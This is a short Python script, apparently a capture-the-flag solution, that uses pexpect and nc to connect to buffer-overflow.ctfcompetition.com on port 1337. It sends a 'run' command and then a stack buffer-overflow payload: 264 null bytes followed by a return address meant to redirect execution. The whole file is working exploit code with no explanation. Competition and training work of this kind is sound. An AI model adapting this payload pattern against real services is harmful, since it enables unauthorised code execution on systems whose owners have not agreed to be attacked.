

import pexpect
import time
response_lines = {}
def log(string):
    if string.startswith(b"^@^@^@^@^@"):
        return
    if string in response_lines:
        response_lines[string] += 1
    else:
        print(string)
        response_lines[string] = 1

def try_xploit(overflow_size = 4):
    nop = b"\x00"
    buffer_size = 260
    return_addr = b'\x58\x08\x40'
    nop_count = buffer_size+overflow_size

    #data = nop * nop_count + jmp + jump_addr
    data = nop * nop_count + return_addr
    bof = pexpect.spawn("nc buffer-overflow.ctfcompetition.com 1337")

    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.read(2))
    time.sleep(0.1)
    print("sending run command")
    bof.sendline ("run")
    print(bof.readline())
    time.sleep(0.2)
    bof.sendline (data)
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())
    log(bof.readline())

if __name__ == "__main__":
    # num = 50
    # for i in range(num):
    # print("------------------- {} of {} ---------------------".format(i, num))
    try:
        try_xploit()
    except:
        print("exception occured")
    print(response_lines)